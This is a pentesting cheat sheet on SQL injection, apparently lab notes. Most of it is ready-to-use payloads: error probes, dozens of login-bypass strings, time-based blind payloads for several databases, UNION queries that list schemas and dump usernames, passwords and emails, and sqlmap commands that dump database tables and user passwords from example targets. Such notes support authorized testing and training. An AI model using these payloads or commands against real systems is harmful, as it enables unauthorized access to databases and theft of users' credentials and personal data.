# SQL injection
## Basic technique
Stick ' , " , ; , -- , ## , /**/.... in a parameter and see if it throws a database error (and note what kind
Another simple test:
```console
' or 1=1-- -
```
Other tests:
```console
'
"
`
')
")
`)
'))
"))
`))
%27
" / %22
; / %3B
%%2727
%25%27
```
## POST parameters
You can also attempt to inject parameters passed using POST requests, but you'll need Burp or Firefox tamper to view and edit them. For example, you can test a parameter by adding a ' at the end, like lang=en'.
## Authentication bypass
```console
'-'
' '
'&'
'^'
'*'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
"-"
" "
"&"
"^"
"*"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x
or 1=1
or 1=1-- 
or 1=1#
or 1=1/*
admin' --
admin' #
admin'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1;#
admin' or 1=1/*
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/*
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'/*
1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
admin" --
admin" #
admin"/*
admin" or "1"="1
admin" or "1"="1"--
admin" or "1"="1"#
admin" or "1"="1"/*
admin"or 1=1 or ""="
admin" or 1=1
admin" or 1=1--
admin" or 1=1#
admin" or 1=1/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*
1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
```
## Comments
```console
MySQL
#comment
-- comment     [Note the space after the double dash]
/*comment*/
/*! MYSQL Special SQL */
================================================================================
PostgreSQL
--comment
/*comment*/
================================================================================
MSQL
--comment
/*comment*/
================================================================================
Oracle
--comment
================================================================================
SQLite
--comment
/*comment*/
================================================================================
HQL
HQL does not support comments
```
## Confirming with Timing
In some cases you won't notice any change on the page you are testing. Therefore, a good way to discover blind SQL injections is making the DB perform actions and will have an impact on the time the page need to load.
```console
MySQL (string concat and logical ops)
1' + sleep(10)
1' and sleep(10)
1' && sleep(10)
1' | sleep(10)
================================================================================
PostgreSQL (only support string concat)
1' || pg_sleep(10)
================================================================================
MSQL
1' WAITFOR DELAY '0:0:10'
================================================================================
Oracle
1' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)
================================================================================
SQLite
1' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
```
## Exploiting Union Based
To find out the number of columns of the current table, there are two ways, use **UNION** or **ORDER BY**
### Order/Group by
Keep incrementing the number until you get a False response. Even though GROUP BY and ORDER BY have different functionality in SQL, they both can be used in the exact same fashion to determine the number of columns in the query.
```console
1' ORDER BY 1-- -;    #True
or
1' ORDER BY 1--+    #True
1' ORDER BY 2--+    #True
1' ORDER BY 3--+    #True
1' ORDER BY 4--+    #False - Query is only using 3 columns
                        #-1' UNION SELECT 1,2,3--+    True
```
```console
1' GROUP BY 1--+    #True
1' GROUP BY 2--+    #True
1' GROUP BY 3--+    #True
1' GROUP BY 4--+    #False - Query is only using 3 columns
                        #-1' UNION SELECT 1,2,3--+    True
```
### UNION SELECT
Select more and more null values until the query is correct:
```console
1' UNION SELECT null-- - Not working
1' UNION SELECT null,null-- - Not working
1' UNION SELECT null,null,null-- - Worked
```
## Find the column that is likely to contain exploitable information
The purpose of this step is to find the column whose content is displayed on the response, and then embed the mined information in it
```console
1' UNION SELECT 1,2,3,4,5,6,7-- -;
1' UNION SELECT 1,2,3,4,version(),database(),user()-- -;
```
## Extract database names, table names and column names
```console
#Database names
1' UniOn Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata

#Tables of a database
1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema=database()--

#Column names
1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,column_name,0x7C) fRoM information_schema.columns wHeRe table_name='user'--

#Collect important data
1' UniOn Select 1,2,3,gRoUp_cOncaT(login,0x3a,password,0x3a,email) fRoM users--
```
# SQLMap - Cheetsheat
## Basic arguments for SQLmap
```console
-u "<URL>" 
-p "<PARAM TO TEST>"
-r request.req (using burp)
--user-agent=SQLMAP 
--random-agent 
--threads=10 
--risk=3 #MAX
--level=5 #MAX
--dbms="<KNOWN DB TECH>" 
--os="<OS>"
--technique="UB" #Use only techniques UNION and BLIND in that order (default "BEUSTQ")
--batch #Non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
--auth-type="<AUTH>" #HTTP authentication type (Basic, Digest, NTLM or PKI)
--auth-cred="<AUTH>" #HTTP authentication credentials (name:password)
--proxy=http://127.0.0.1:8080
--union-char "GsFRts2" #Help sqlmap identify union SQLi techniques with a weird union char
```
## Retrieve Information
### Internal
```console
--current-user #Get current user
--is-dba #Check if current user is Admin
--hostname #Get hostname
--users #Get usernames od DB
--passwords #Get passwords of users in DB
--privileges #Get privileges
```
### DB data
```console
--all #Retrieve everything
--dump #Dump DBMS database table entries
--dbs #Names of the available databases
--tables #Tables of a database ( -D <DB NAME> )
--columns #Columns of a table  ( -D <DB NAME> -T <TABLE NAME> )
-D <DB NAME> -T <TABLE NAME> -C <COLUMN NAME> #Dump column
```
Scanning remote system
```console
sqlmap.py -u "http://www.site.com/section.php?id=51"
```
Discover Databases
```console
sqlmap.py -u "http://www.sitemap.com/section.php?id=51" --dbs
```
Find tables in a particular database
```console
sqlmap.py -u "http://www.site.com/section.php?id=51" --tables -D safecosmetics
```
Get columns of a table
```console
sqlmap.py -u "http://www.site.com/section.php?id=51" --columns -D safecosmetics -T users
```
Get data from a table
```console
python sqlmap.py -u "http://www.site.com/section.php?id=51" --dump -D safecosmetics -T users
```
*In most lab scenarios, the database will be MySQL so we can add the **--dbms=mysql** parameter to the command line*
```console
sqlmap.py -u "http://www.sitemap.com/section.php?id=51" --dbs --dbms=mysql
```
### Passing tokens
If the URL isn't accessible, you can pass cookie data or authentication credentials to SQLmap by pasting the post request in a file and using the -r option:
```console
sqlmap -r request.txt
```
If you just need to pass a cookie:
```console
sqlmap -u "http://10.10.10.185/login.php" --cookie "PHPSESSID=foobar"
```
